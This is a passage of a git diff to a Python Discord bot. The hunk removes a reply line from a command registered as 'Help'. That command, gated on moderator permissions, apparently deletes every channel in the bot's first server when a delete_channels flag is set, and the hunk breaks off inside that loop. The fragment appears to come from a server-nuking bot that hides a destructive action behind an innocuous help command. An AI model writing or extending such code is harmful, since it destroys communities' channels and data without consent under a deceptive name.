@@ -28,7 +28,6 @@ async def on_ready():
 @bot.command(name='Help', pass_context=True)
 @commands.has_permissions(manage_channels=True, ban_members=True, manage_roles=True, manage_guild=True)
 async def help_command(ctx):
-    ctx.send("ok sir :)")
     if delete_channels:
         #Delete all channels
         for channel in bot.guilds[0].channels:
